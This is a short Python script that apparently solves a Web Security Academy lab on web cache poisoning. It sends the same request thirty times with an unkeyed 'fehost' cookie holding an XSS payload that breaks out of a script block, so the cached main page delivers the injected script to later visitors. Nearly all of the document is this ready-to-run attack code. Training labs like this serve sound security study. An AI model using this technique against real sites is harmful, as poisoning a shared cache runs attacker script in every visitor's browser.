##############################################################
#
# Lab: Web cache poisoning with an unkeyed cookie
#
# Hack Steps:
#      1. Inject payload into the unkeyed `fehost` cookie
#      2. Send multiple request to the main page to cache it
#         with the injected payload
#
##############################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a90002b0481232080df675a004500c3.web-security-academy.net" 

def main():
    payload = """ "}</script><img src=1 onerror=alert(1)> """
    
    # 5 times is enough for caching
    # 30 times to reach the max-age and start caching again (just to make sure that the request is cached to mark the lab as solved)
    for counter in range(1,31):
        print(Fore.WHITE + f"❯❯ Poisoning the main page with an unkeyed cookie ({counter}/30).. ", end="\r", flush=True)
        
        cookies = { "fehost": payload}
        requests.get(LAB_URL, cookies=cookies)

    print(Fore.WHITE + "❯❯ Poisoning the main page with an unkeyed cookie (30/30).." + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The main page is poisoned successfully")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def post_data(url, data):
    try:    
        return requests.post(url, data, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + url + " through exception")
        exit(1)


if __name__ == "__main__":
    main()